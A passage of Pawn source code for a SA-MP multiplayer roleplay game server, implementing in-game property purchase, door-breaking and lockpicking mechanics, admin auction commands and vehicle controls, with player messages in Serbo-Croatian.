	else if( PlayerInfo[ playerid ][ xProperty ][ 1 ] == -1 ) 
	{ 
		PlayerInfo[ playerid ][ xProperty ][ 1 ] = id; 
		PlayerInfo[ playerid ][ xPropertySqlID ][ 1 ] = II[id][iSQLID];
	}
	else if( PlayerInfo[ playerid ][ xProperty ][ 2 ] == -1 ) 
	{ 
		PlayerInfo[ playerid ][ xProperty ][ 2 ] = id; 
		PlayerInfo[ playerid ][ xPropertySqlID ][ 2 ] = II[id][iSQLID];
	}

	DajIgracuNovac( playerid, -II[ id ][ iPrice ] );
	II[ id ][ iOwned ] = 1;
	II[ id ][ iOnAuction ] = false;
	II[ id ][ iOwnerSQLID ] = PlayerInfo[playerid][xID];
	II[ id ][ iNeaktivnost ] = 0;
	strmid( II[ id ][ iOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255 );
    PlayerPlaySound( playerid, 1058, 0, 0, 0 );

    SCMF( playerid, 0x4282C0FF, "(IMOVINA): Kupili ste {FFFFFF}%s.", GetPropertyName( id ) );

    if(questInfo[playerid][qt_EasyQuest][6] == false) {
    	questInfo[playerid][qt_EasyQuest][6] = true;
    	sql_UpdateQuest(playerid);

		KillTimer(QuestTimer[playerid]);
		quest_CreateTDs(playerid, false);

		quest_CreateTDs(playerid, true);
		PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "CESTITAMO, RIJESILI STE ~p~ZADATAK BR.7");
		PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "Nagradu mozete preuzeti~n~~p~(/zadaci pocetni)");

		QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 1);
    }
    PropertyRefresh( id );
	SaveProperty( id );
    sql_user_update_property( playerid );
	return 1;
}

CMD:breakdoor( playerid )
{
    foreach(new i : iter_Imovina)
	{
		if( IsPlayerInRangeOfPoint( playerid, 2, II[ i ][ iEnter ][ 0 ], II[ i ][ iEnter ][ 1 ], II[ i ][ iEnter ][ 2 ] ) )
		{
			if( strcmp( II[ i ][ iOwner ], ImeIgraca( playerid ), false ) )
			{
   				if( PlayerInfo[ playerid ][ xToolkit ] == 0)
   				{
       				SendErrorMessage( playerid, "Nemas alat za obijanje brava." );
					return 1;
				}
				if(PokusajProvala[playerid])
				{
    				SendClientMessage( playerid, CRVENA, "(IMOVINA): Vec ste u procesu provaljivanja." );
					return 1;
				}
				if( II[ i ][ iLocked ] == 1)
				{
				    if( II[ i ][ iAlarm ] == 4)
					{
					    foreach( new h : Player)
						{
   							if( strcmp( ImeIgraca( h ), II[ i ][ iOwner ], true) == 0 )
					   		{
					   		    SendClientMessage( h, ZUTA, "(SMS): Netko vam pokusava provaliti u kucu, Vas Alarm!" );
				   			}
						}
						for( new id = 1; id < MAX_ORG; id++)
						{
		    				if( org_info[ id ][ oTip ] == ORG_TIP_VLADINA )
							{
								OrgPoruka( id, 0x2641FEAA, "(HQ): Svim jedinicama: 10-31 | Prijavio: Tihi Alarm" );
								OrgPoruka( id, 0x2641FEAA, "(HQ): Zlocin: Provala u kucu | Osumljiceni: Nepoznat" );
								OrgPoruka( id, 0x2641FEAA, "(HQ): Adresa kuce: %s", II[ i ][ iAdress ] );
							}
						}
					}
					switch(II[ i ][ iLockLevel ])
					{
					    case 0:
						{
					        SendClientMessage( playerid, ZUTA, "(IMOVINA): Pokusavate provaliti bravu na kucnim vratima. (30 sec)");
							SetPlayerTimerEx(playerid, "Provala", 30000, false, "i", playerid);
							Odbrojavanje[ playerid ] = 30;
						}
						case 1:
						{
						    SendClientMessage( playerid, ZUTA, "(IMOVINA): Pokusavate provaliti bravu na kucnim vratima. (60 sec)");
						    SetPlayerTimerEx(playerid, "Provala", 60000, false, "i", playerid);
							Odbrojavanje[ playerid ] = 60;
						}
						case 2:
						{
						    SendClientMessage( playerid, ZUTA, "(IMOVINA): Pokusavate provaliti bravu na kucnim vratima. (2 min)");
						    SetPlayerTimerEx(playerid, "Provala", 120000, false, "i", playerid);
							Odbrojavanje[ playerid ] = 120;
						}
						case 3:
						{
						    SendClientMessage( playerid, ZUTA, "(IMOVINA): Pokusavate provaliti bravu na kucnim vratima. (4 min)");
						    SetPlayerTimerEx(playerid, "Provala", 240000, false, "i", playerid);
							Odbrojavanje[ playerid ] = 240;
						}
						case 4:
						{
						    SendClientMessage( playerid, ZUTA, "(IMOVINA): Pokusavate provaliti bravu na kucnim vratima. (8 min)");
						    SetPlayerTimerEx(playerid, "Provala", 480000, false, "i", playerid);
							Odbrojavanje[ playerid ] = 480;
						}
					}

     				SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s uzima alat i pokusava obiti bravu na vratima.", ImeIgraca( playerid ) );

					SMG_TogglePlayerControllable( playerid, false );
                    PokusajProvala[playerid] = true;
					PlayerInfo[ playerid ][ xToolkit ] = 0;
					sql_user_update_integer( playerid, "toolkit", PlayerInfo[ playerid ][ xToolkit ] );
				}
				else
				{
					SendClientMessage( playerid, CRVENA, "(IMOVINA): Vrata su otkljucana profesionalcu...");
					return 1;
				}
			}
			else
			{
				SendClientMessage( playerid, CRVENA, "(IMOVINA): Necete valjda sami sebi razvaliti vrata?");
				return 1;
			}
		}
	}
	return 1;
}

CMD:prekiniobijanje( playerid )
{
    if(BreakingLock[playerid] == 1)
	{
		SMG_TogglePlayerControllable( playerid, true );

		KillTimer(BreakLockTimer[playerid]);
		KillTimer(breakcounttimer[playerid]);

		BreakLockTimerCalled[playerid] = 0;
		BreakingLock[playerid] = 0;
	}
	else if(StartingVehicle[playerid])
	{
		SMG_TogglePlayerControllable( playerid, true );
		RemovePlayerFromVehicle( playerid );

		KillTimer(EngineStartTimer[playerid]);
		KillTimer(immobcounttimer[playerid]);

		ImmobTimerCalled[playerid] = false;
		StartingVehicle[playerid] = false;
	}
    else if(PokusajProvala[playerid])
	{
 		SMG_TogglePlayerControllable( playerid, true );

		PokusajProvala[playerid] = false;
		Odbrojavanje[ playerid ] = 0;
	}
	else SendErrorMessage( playerid, "Ova komanda sluzi da prekines provaljivanje.");
	return 1;
}

CMD:smashdoor( playerid )
{
    foreach(new i : iter_Imovina)
	{
		if( IsPlayerInRangeOfPoint( playerid, 2, II[i][ iEnter ][ 0 ], II[i][ iEnter ][ 1 ], II[i][ iEnter ][ 2 ] ) )
		{
			if( strcmp( II[ i ][ iOwner ], ImeIgraca( playerid ), false ) )
			{
				if(PokusajProvala[playerid])
				{
    				SendErrorMessage( playerid, "Ne mozete koristiti ovu komandu dok ste u procesu provaljivanja!");
					return 1;
				}
				if( II[ i ][ iLocked ] == 1)
				{
				    switch(II[ i ][ iDoorLevel ])
				    {
					    case 0:
						{
					        if( PlayerInfo[ playerid ][ xSnaga ] < 4)
							{
					            SendClientMessage( playerid, CRVENA, "(IMOVINA): Vrata su precvrsta za vasu snagu. [ /upgrade ]");
					            return 1;
							}

					        SendInfoMessage( playerid, "Uspjeli ste razbiti vrata na snagu. Vrata su se otvorila.");
					        II[ i ][ iLocked ] = 0;
						}
						case 1:
						{
						    if( PlayerInfo[ playerid ][ xSnaga ] < 7)
							{
					            SendClientMessage( playerid, CRVENA, "(IMOVINA): Vrata su precvrsta za vasu snagu. [ /upgrade ]");
					            return 1;
							}

					        SendInfoMessage( playerid, "Uspjeli ste razbiti vrata na snagu. Vrata su se otvorila.");
					        II[ i ][ iLocked ] = 0;
						}
						case 2:
						{
						    if( PlayerInfo[ playerid ][ xSnaga ] < 10)
							{
					            SendClientMessage( playerid, CRVENA, "(IMOVINA): Vrata su precvrsta za vasu snagu. [ /upgrade ]");
					            return 1;
							}

					        SendInfoMessage( playerid, "Uspjeli ste razbiti vrata na snagu. Vrata su se otvorila.");
					        II[ i ][ iLocked ] = 0;
						}
						case 3:
						{
						    if( PlayerInfo[ playerid ][ xSnaga ] < 15)
							{
					            SendClientMessage( playerid, CRVENA, "(IMOVINA): Vrata su precvrsta za vasu snagu. [ /upgrade ]");
					            return 1;
							}

					        SendInfoMessage( playerid, "Uspjeli ste razbiti vrata na snagu. Vrata su se otvorila.");
					        II[ i ][ iLocked ] = 0;
						}
						case 4:
						{
						    if( PlayerInfo[ playerid ][ xSnaga ] < 20)
							{
					            SendClientMessage( playerid, CRVENA, "(IMOVINA): Vrata su precvrsta za vasu snagu. [ /upgrade ]");
					            return 1;
							}

					        SendInfoMessage( playerid, "Uspjeli ste razbiti vrata na snagu. Vrata su se otvorila.");
					        II[ i ][ iLocked ] = 0;
						}
						case 5:
						{
						    SendClientMessage( playerid, CRVENA, "(IMOVINA): Vrata su precvrsta za da bi ih obican covjek razbio.");
						    return 1;
						}
					}

					if( II[ i ][ iAlarm ] >= 2)
					{
						if( II[ i ][ iAlarm ] == 2)
						{
						    foreach( new h : Player)
							{
						   		if( strcmp( ImeIgraca( h ), II[ i ][ iOwner ], true) == 0 )
						   		{
						   		    SendClientMessage( h, ZUTA, "(SMS): Netko vam je provalio u kucu! Pozovite policiju, Vas Alarm!");
					   			}
							}
						}

						if( II[ i ][ iAlarm ] >= 3)
						{
						    for( new id = 1; id < MAX_ORG; id++)
							{
		    					if( org_info[ id ][ oTip ] == ORG_TIP_VLADINA )
								{
									OrgPoruka( id, 0x2641FEAA, "(HQ): Svim jedinicama: 10-31 | Prijavio: Alarm");
									OrgPoruka( id, 0x2641FEAA, "(HQ): Zlocin: Provala u kucu | Osumljiceni: Nepoznat");
									OrgPoruka( id, 0x2641FEAA, "(HQ): Adresa kuce: %s", II[ i ][ iAdress ]);
								}
							}
						}
						SendNearbyMessage(playerid, 60.0, 0xC2A2DAFF, "%s ALARM | BEEP BEEP BEEP!!", II[ i ][ iAdress ] );
					}
     				SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s se zaljece i udara nogom u vrata.", ImeIgraca( playerid ) );

			      	ApplyAnimation( playerid, "POLICE", "Door_Kick", 4.0, 0, 0, 0, 0, 0, 1);
			      	ApplyAnimation( playerid, "POLICE", "Door_Kick", 4.0, 0, 0, 0, 0, 0, 1);
					return 1;
				}
				else
				{
					SendClientMessage( playerid, CRVENA, "(IMOVINA): Vrata su otkljucana." );
					return 1;
				}
			}
			else
			{
				SendErrorMessage( playerid, "Ne mozes sam sebi razvalit vrata!" );
				return 1;
			}
		}
	}
	return 1;
}

CMD:aukcije(playerid, const params[])
{
	if(PlayerInfo[playerid][xAdmin] < 7) return SendErrorMessage(playerid, "Niste ovlasceni.");

	new odabir[10];
	if(sscanf(params, "s[10]", odabir))
	{
		SendUsageMessage(playerid, "/aukcije [opcija]");
     	SendClientMessage(playerid, -1, "[Opcije] imovine, firme");
		return 1;
	}

	new str[1024], counted = 0;
	if(strcmp(odabir, "imovine", true) == 0)
	{
	    foreach(new i : iter_Imovina)
	    {
	        if(II[i][iOnAuction]) format(str, sizeof(str), "%s{4282C0}(ID: %d) {FFFFFF}%s\n", str, i, GetPropertyName(i)), counted++;
	    }

	    if(counted != 0) ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Aukcije - Imovina:", str, "OK", "");
	    else SendErrorMessage(playerid, "Nema imovine na aukciju.");
	}
	else if(strcmp(odabir, "firme", true) == 0)
	{
	    foreach(new i : iter_Bizz)
	    {
	        if(BusinessInfo[i][bOnAuction]) format(str, sizeof(str), "%s{4282C0}(ID: %d) {FFFFFF}%s\n", str, i, BusinessInfo[i][bName]), counted++;
	    }

	    if(counted != 0) ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Aukcije - Firme:", str, "OK", "");
	    else SendErrorMessage(playerid, "Nema firmi na aukciji.");
	}
	else SendErrorMessage(playerid, "Pogresna vrsta.");
	return 1;
}

CMD:prodajsaaukcije(playerid, const params[])
{
	if(PlayerInfo[playerid][xAdmin] < 7) return SendErrorMessage(playerid, "Niste ovlasceni.");

	new odabir[10], targetid, id, cena;
	if(sscanf(params, "s[10]uii", odabir, targetid, id, cena))
	{
		SendUsageMessage(playerid, "/prodajsaaukcije [opcija] [targetid] [id imovine/firme] [cena po kojoj je prodato]");
     	SendClientMessage(playerid, -1, "[Opcije] imovina, firma");
		return 1;
	}
	if(targetid == IPI) return SendErrorMessage(playerid, "Pogresan ID.");
	if(cena < 1 || cena > 999999999) return SendErrorMessage(playerid, "Prevelika ili premala cena(1$ > 999.999.999$).");

	if(strcmp(odabir, "imovina", true) == 0)
	{
	    if(!II[id][iOnAuction]) return SendErrorMessage(playerid, "Ta imovina nije na aukciji.");
	    if(II[id][iOwned] != 0) return SendErrorMessage(playerid, "Ta imovina nije na prodaju.");
	    if(PlayerInfo[targetid][xNovac] < cena) return SendErrorMessage(playerid, "Taj igrac nema toliko novca.");
	    if( PlayerInfo[ targetid ][ xProperty ][ 0 ] != -1 && PlayerInfo[ targetid ][ xProperty ][ 1 ] != -1 && PlayerInfo[ targetid ][ xProperty ][ 2 ] != -1 ) return SendErrorMessage( playerid, "Vec poseduje 3 imovine!");

		if( PlayerInfo[ targetid ][ xProperty ][ 0 ] == -1 ) 
		{ 
			PlayerInfo[ targetid ][ xProperty ][ 0 ] = id;
			PlayerInfo[ targetid ][ xPropertySqlID ][ 0 ] = II[id][iSQLID];
		}
		else if( PlayerInfo[ targetid ][ xProperty ][ 1 ] == -1 ) 
		{ 
			PlayerInfo[ targetid ][ xProperty ][ 1 ] = id;
			PlayerInfo[ targetid ][ xPropertySqlID ][ 1 ] = II[id][iSQLID];
		}
		else if( PlayerInfo[ targetid ][ xProperty ][ 2 ] == -1 ) 
		{ 
			PlayerInfo[ targetid ][ xProperty ][ 2 ] = id;
			PlayerInfo[ targetid ][ xPropertySqlID ][ 2 ] = II[id][iSQLID];
		}

		DajIgracuNovac( targetid, -cena );
		II[ id ][ iOwned ] = 1;
		II[ id ][ iOnAuction ] = false;
		II[ id ][ iOwnerSQLID ] = PlayerInfo[targetid][xID];
		II[ id ][ iNeaktivnost ] = 0;
		strmid( II[ id ][ iOwner ], ImeIgraca( targetid ), 0, strlen( ImeIgraca( targetid ) ), 255 );
	    PlayerPlaySound( targetid, 1058, 0, 0, 0 );

	    SCMF( targetid, 0x4282C0FF, "(IMOVINA): {FFFFFF}%s {4282C0}vam je postavio {FFFFFF}%s {4282C0}sa aukcije za {FFFFFF}($%s).", ImeIgraca(playerid), GetPropertyName( id ), fNumber(cena));
	    SCMF( playerid, 0x4282C0FF, "(IMOVINA): Postavili ste {FFFFFF}'%s-u' {4282C0}imovinu {FFFFFF}%s {4282C0}sa aukcije za {FFFFFF}($%s).", ImeIgraca(targetid), GetPropertyName( id ), fNumber(cena));

	    PropertyRefresh( id );
		SaveProperty( id );
	    sql_user_update_property( targetid );
	}
	else if(strcmp(odabir, "firma", true) == 0)
	{
	    if(!BusinessInfo[id][bOnAuction]) return SendErrorMessage(playerid, "Ta firma nije na aukciji.");
	    if(BusinessInfo[id][bOwner_sqlID] != -1) return SendErrorMessage(playerid, "Ta firma nije na prodaju.");
	    if( PlayerInfo[ targetid ][ xFirmaID ] != -1 ) return SendErrorMessage( playerid, "Vec poseduje firmu!");
		if( PlayerInfo[ targetid ][ xNovac ] < cena ) return SendErrorMessage( playerid, "Nema dovoljno novca za kupovinu firme!");

		PlayerInfo[ targetid ][ xFirmaID ] = id;
		PlayerInfo[ targetid ][ xBussinesSqlID ] = BusinessInfo[ id ][ b_ID ];
		DajIgracuNovac( targetid, -cena );
		BusinessInfo[ id ][ bLocked ] = 0;
		BusinessInfo[ id ][ bOnAuction ] = false;
		BusinessInfo[ id ][ bNeaktivnost ] = 0;
		BusinessInfo[ id ][ bFacture ] = 100;
		BusinessInfo[ id ][ bOwner_sqlID ] = PlayerInfo[ targetid ][ xID ];
		strmid( BusinessInfo[ id ][ bOwner ], ImeIgraca( targetid ), 0, strlen( ImeIgraca( targetid ) ), 255);
		Bussines_Refresh( id );

		new q[ 256 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `b_owner_sqlID` = '%d', `bOnAuction` = '0', `bOwner` = '%s', `b_neaktivnost` = '%d', `b_facture` = '%d' WHERE `bussines_id` = '%d'",
				BusinessInfo[ id ][ bOwner_sqlID ],
				BusinessInfo[ id ][ bOwner ],
				BusinessInfo[ id ][ bNeaktivnost ],
				BusinessInfo[ id ][ bFacture ], BusinessInfo[ id ][ b_ID ] );

		mysql_tquery( mSQL, q );

		sql_user_update_integer( targetid, "bussines_id", PlayerInfo[ targetid ][ xBussinesSqlID ] );

		SCMF( targetid, 0x4282C0FF, "(FIRMA): {FFFFFF}%s {4282C0}vam je postavio firmu sa aukcije za {FFFFFF}($%s).", ImeIgraca(playerid), fNumber(cena));
		SendClientMessage( targetid, 0xFF4500FF, "(FIRMA): UKOLIKO VAM FAKTURE DODJU NA 0, FIRMA CE SE PRODATI AUTOMATSKI." );
		SCMF( playerid, 0x4282C0FF, "(FIRMA): Postavili ste {FFFFFF}'%s-u' {4282C0}firmu sa aukcije za {FFFFFF}($%s).", ImeIgraca(targetid), fNumber(cena));
	}
	else SendErrorMessage(playerid, "Pogresna vrsta.");
	return 1;
}

CMD:sklonisaaukcije(playerid, const params[])
{
	if(PlayerInfo[playerid][xAdmin] < 7) return SendErrorMessage(playerid, "Niste ovlasceni.");

	new odabir[10], id;
	if(sscanf(params, "s[10]i", odabir, id))
	{
		SendUsageMessage(playerid, "/sklonisaaukcije [opcija] [id imovine/firme]");
     	SendClientMessage(playerid, -1, "[Opcije] imovina, firma");
		return 1;
	}

	if(strcmp(odabir, "imovina", true) == 0)
	{
	    if(!II[id][iOnAuction]) return SendErrorMessage(playerid, "Ta imovina nije na aukciji.");

		II[ id ][ iOnAuction ] = false;
	    PropertyRefresh( id );
		SaveProperty( id );

	    SCMF( playerid, 0x4282C0FF, "(IMOVINA): Sklonili ste {FFFFFF}%s {4282C0}sa aukcije.", GetPropertyName( id ) );
	}
	else if(strcmp(odabir, "firma", true) == 0)
	{
	    if(!BusinessInfo[id][bOnAuction]) return SendErrorMessage(playerid, "Ta firma nije na aukciji.");
	    if(BusinessInfo[id][bOwner_sqlID] != -1) return SendErrorMessage(playerid, "Ta firma nije na prodaju.");

		BusinessInfo[ id ][ bOnAuction ] = false;
		Bussines_Refresh( id );

		new q[ 120 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `bOnAuction` = '0' WHERE `bussines_id` = '%d'", BusinessInfo[ id ][ b_ID ] );
		mysql_tquery( mSQL, q );

		SendClientMessage( playerid, 0x4282C0FF, "(FIRMA): Sklonili ste firmu sa aukcije." );
	}
	else SendErrorMessage(playerid, "Pogresna vrsta.");
	return 1;
}

// Veh System
CMD:hauba( playerid )
{
    new engine,lights,alarm,doors,bonnet,boot,objective,
		vehicle = GetPlayerVehicleID(playerid);

	if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER)
	{
		SendClientMessage( playerid, CRVENA, "(VOZILO): Morate biti vozac da bi ste mogli koristit ovu komandu.");
		return 1;
	}
	if( IsVehicleBajs( vehicle ) || IsVehicleMotor( vehicle ) || IsVehicleBrod( vehicle ) )
	{
		SendErrorMessage( playerid, "Nepoznata akcija za ovu vrstu vozila.");
		return 1;
	}

	GetVehicleParamsEx( vehicle, engine, lights, alarm, doors, bonnet, boot, objective );
	if( bonnet == 0) SetVehicleParamsEx( vehicle,engine,lights,alarm,doors,1,boot,objective);
 	else SetVehicleParamsEx( vehicle,engine,lights,alarm,doors,0,boot,objective);
	return 1;
}

CMD:svetla( playerid )
{
    new engine,lights,alarm,doors,bonnet,boot,objective,
		vehicle = GetPlayerVehicleID(playerid);
	if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER )
	{
		SendClientMessage( playerid, CRVENA, "(VOZILO): Morate biti vozac da bi ste mogli koristit ovu komandu." );
		return 1;
	}
	if( IsVehicleBajs( vehicle ) || IsVehicleBrod( vehicle ) )
	{
		SendErrorMessage( playerid, "Nepoznata akcija za ovu vrstu vozila." );
		return 1;
	}
	GetVehicleParamsEx( vehicle, engine, lights, alarm, doors, bonnet, boot, objective );
	if( lights == 0 ) SetVehicleParamsEx( vehicle,engine,1,alarm,doors,bonnet,boot,objective);
	else SetVehicleParamsEx( vehicle,engine,0,alarm,doors,bonnet,boot,objective);
	return 1;
}

CMD:gepek( playerid )
{
    if( WARPInfo[ playerid ][ WARIgrac ] != -1 ) return SendErrorMessage( playerid, "Ne mozes ovo dok si u waru." );
    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok si na dmu." );
    if( tdm_player_info[ playerid ][ tdm_Team ] != 0 ) return SendErrorMessage( playerid, "Ne mozes ovo dok si na tdm eventu." );

 	new vehicleid, found, Float:X, Float:Y, Float:Z;
    for( new i = 0; i <= GetVehiclePoolSize(); i++)
    {
        GetVehiclePos(i, X, Y, Z);
        if( IsPlayerInRangeOfPoint( playerid, 5.0, X, Y, Z))
		{
            vehicleid = i;
            found = 1;
            break;
        }
        else
            continue;
    }
	if( found == 0 ) return SendErrorMessage( playerid, "Niste blizu vozila.");

    new Float:vehPos[ 3 ];
	getPosBehindVehicle( vehicleid, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ], 0.0 );
	if( !IsPlayerInRangeOfPoint( playerid, 2, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ] ) ) return SendErrorMessage( playerid, "Morate biti pored prtljaznika." );

	if( IsANoTrunkVehicle( vehicleid ) ) return SendErrorMessage( playerid, "Ovo vozilo nema prtljaznik!");
	if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama da biste zatvorili/otvorili prtljaznik.");
	if( IsVehicleBajs( vehicleid ) || IsVehicleMotor( vehicleid ) || IsVehicleBrod( vehicleid ) )
	{
		SendErrorMessage( playerid, "Nepoznata akcija.");
		return 1;
	}

	if( VehicleInfo[ vehicleid ][ vSqlID ] == 0 ) return SendErrorMessage( playerid, "Ovo vozilo nije ispravno kreirano, ako mislis da je greska obrati se Admin timu." );

	ShowPlayerDialog( playerid, dialog_GEPEK, DIALOG_STYLE_LIST, D_NASLOV,
																			"{4282C0}(1). {FFFFFF}Otvori/Zatvori gepek\n\
																			{4282C0}(2). {FFFFFF}Informacije\n\
																			{4282C0}(3). {FFFFFF}Ostavi\n\
																			{4282C0}(4). {FFFFFF}Izvadi", "Potvrdi", "Nazad" );
	return 1;
}

CMD:upalivozilo( playerid, const params[] )
{
	new vehicle = GetPlayerVehicleID( playerid );

	if( !IsPlayerInAnyVehicle( playerid )) return SendErrorMessage( playerid, "Morate biti u vozilu da biste koristili ovu komandu!");
	if( vCanDrive[ vehicle ] == 0 ) return SendErrorMessage( playerid, "Ovo vozilo je unisteno i ne moze se pokrenuti.");
	if( IsVehicleBajs( vehicle ) ) return SendErrorMessage( playerid, "Stvarno mislis upaliti biciklu? " );
	if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti vozac da bi ste mogli koristit ovu komandu.");
	if( StartingVehicle[playerid] == true ) return SendErrorMessage( playerid, "Vec palite vozilo." );

	if( VehicleInfo[ vehicle ][ vUsage ] != PRIVATNO_VOZILO ) return SendErrorMessage( playerid, "Nisi u nijednom privatnom vozilu." );

	new autoid = vehicle;
	if( VehicleInfo[ autoid ][ vOwner_sqlID ] != 0 )
	{
		if( strcmp( ImeIgraca( playerid ), VehicleInfo[ autoid ][ vOwner ], true) == 0 )
		{
			SendErrorMessage( playerid, "Neces valjda da obijas svoje vozilo?");
			return 1;
		}
		else
		{
		    if( PlayerInfo[ playerid ][ xToolkit ] == 1 )
			{
				new time;
				switch( VehicleInfo[ autoid ][ vImobilizator ] )
				{
					case 0: time = 30000;
					case 1: time = 60000;
					case 2: time = 120000;
					case 3: time = 240000;
					case 4: time = 360000;
					case 5: time = 480000;
				}
				SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s vadi alat za obijanje i pokusava upaliti vozilo pomocu alata.", ImeIgraca( playerid ) );

				SendClientMessage( playerid, ZUTA, "(VOZILO): Da prekinete paljenje vozila proces ukucajte {FFFFFF}[ /prekiniobijanje ].");
				SMG_TogglePlayerControllable( playerid, false );

				EngineStartTimer[playerid] = SetPlayerTimerEx(playerid, "VehicleEngineStart", 2000, false, "i", playerid);

				immobsecounds[playerid] = (time/1000)+1;
				immobcounttimer[playerid] = SetPlayerTimerEx(playerid, "ImmobCountForPlayer", 1000, true, "i", playerid);
				ImmobTimerCalled[playerid] = true;
				StartingVehicle[playerid] = true;
				PlayerInfo[ playerid ][ xToolkit ] = 0;
				sql_user_update_integer( playerid, "toolkit", PlayerInfo[ playerid ][ xToolkit ] );
			}
			else SendErrorMessage( playerid, "Nemas alat za obijanje!");
		}
	}
	else
	{
		SendErrorMessage( playerid, "Ovo vozilo nije moguce obiti.");
		return 1;
	}
	return 1;
}

CMD:obijbravu( playerid )
{
    new vehicleid, found, Float:X, Float:Y, Float:Z;
    for( new i = 0; i <= GetVehiclePoolSize(); i++ )
	{
        GetVehiclePos( i, X, Y, Z );

        if( IsPlayerInRangeOfPoint( playerid, 3.0, X, Y, Z ) )
		{
            vehicleid = i;
            found = 1;
            break;
        }
        else
            continue;
    }
    if( found == 0 )
	{
        SendErrorMessage( playerid, "Niste blizu vozila.");
        return 1;
    }

	if( VehicleInfo[ vehicleid ][ vUsage ] == PRIVATNO_VOZILO )
	{
		if( strcmp( ImeIgraca( playerid ), VehicleInfo[ vehicleid ][ vOwner ], true) == 0 )
		{
			SendErrorMessage( playerid, "Necete obiti valjda svoje vozilo." );
			return 1;
		}
		else
		{
      		if( PlayerInfo[ playerid ][ xLevel ] < 5 || PlayerInfo[ playerid ][ xToolkit ] == 0 ) return SendErrorMessage( playerid, "Moras biti najmanje level 5 ili nemas alat za obijanje.");
		    if( BreakingLock[playerid] != 0) return SendErrorMessage( playerid, "Vec si u procesu provaljivanja brave!");
			if( VehicleInfo[ vehicleid ][ vLocked ] == 0 ) return SendErrorMessage( playerid, "Auto je otkljucan!");

			new time;
		  	switch( VehicleInfo[ vehicleid ][ vLock ] )
	  		{
				case 0: time = 30000;
				case 1: time = 60000;
				case 2: time = 120000;
				case 3: time = 240000;
				case 4: time = 360000;
				case 5: time = 480000;
			}

			SendNearbyMessage(playerid, 30.0, 0xC2A2DAFF, "* %s vadi alat za obijanje i pokusava provaliti bravu na vozilu.", ImeIgraca( playerid ) );
			SendClientMessage( playerid, ZUTA, "(VOZILO): Da prekinete proces obijanja brave ukucajte {FFFFFF}[ /prekiniobijanje ].");

			BreakLockTimer[playerid] = SetPlayerTimerEx(playerid, "VehicleBreakLock", time, true, "ii", playerid, vehicleid);
	        SMG_TogglePlayerControllable( playerid, false );

			breaksecounds[playerid] = ( time/1000 )-1;
			breakcounttimer[playerid] = SetPlayerTimerEx(playerid, "BreakLockCountForPlayer", 1000, true, "i", playerid);
			BreakLockTimerCalled[playerid] = 1;
			BreakingVehicle[playerid] = vehicleid;

			BreakingLock[playerid] = 1;
			PlayerInfo[ playerid ][ xToolkit ] = 0;
			sql_user_update_integer( playerid, "toolkit", PlayerInfo[ playerid ][ xToolkit ] );
		}
	}
	return 1;
}

VehicleLockStatusChange( playerid, vehicleid, veh_type )
{
	new text_s[ 24 ], engine, lights, alarm, doors, bonnet, boot, objective;

	if( veh_type == PRIVATNO_VOZILO ) { text_s = " svoje "; }
	else { text_s = " "; }

    GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
	if( doors == 0 )
	{
		VehicleInfo[ vehicleid ][ vLocked ] = 1;

		SetVehicleParamsEx( vehicleid, engine, lights, alarm, 1, bonnet, boot, objective);
		SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s zakljucava%svozilo marke %s.", ImeIgraca( playerid ), text_s, GetVehicleNameEx( GetVehicleModel( vehicleid ) ) );

		if( veh_type == PRIVATNO_VOZILO )
		{
			new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_locked` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
															VehicleInfo[ vehicleid ][ vLocked ],
															VehicleInfo[ vehicleid ][ vSqlID ] );
			mysql_tquery( mSQL, q );
		}

		SCMF(playerid, ZUTA, "(VOZILO): Zakljucali ste vozilo marke {FFFFFF}%s.", GetVehicleNameEx( GetVehicleModel( vehicleid ) ) );
	}
	else if( doors == 1 )
	{
  		VehicleInfo[ vehicleid ][ vLocked ] = 0;
 		SetVehicleParamsEx( vehicleid, engine, lights, alarm, 0, bonnet, boot, objective);
		SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s otkljucava%svozilo marke %s.", ImeIgraca( playerid ), text_s, GetVehicleNameEx( GetVehicleModel( vehicleid ) ) );

        if( veh_type == PRIVATNO_VOZILO )
		{
			new q[ 128 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `vehicles` SET `v_locked` = '%d' WHERE `veh_id` = '%d' LIMIT 1",
															VehicleInfo[ vehicleid ][ vLocked ],
															VehicleInfo[ vehicleid ][ vSqlID ] );
			mysql_tquery( mSQL, q );
		}

		SCMF(playerid, ZUTA, "(VOZILO): Otkljucali ste vozilo marke {FFFFFF}%s.", GetVehicleNameEx( GetVehicleModel( vehicleid ) ) );
	}
}

CMD:lock( playerid )
{
    new vehicleid, found, Float:X, Float:Y, Float:Z;
    if(!IsPlayerInAnyVehicle(playerid))
    {
	    for( new i = 0; i <= GetVehiclePoolSize(); i++ )
		{
	        GetVehiclePos( i, X, Y, Z );

	        if( IsPlayerInRangeOfPoint( playerid, 5.0, X, Y, Z ) )
			{
	            vehicleid = i;
	            found = 1;
	            break;
	        }
	        else
	            continue;
	    }
	    if( found == 0 )
		{
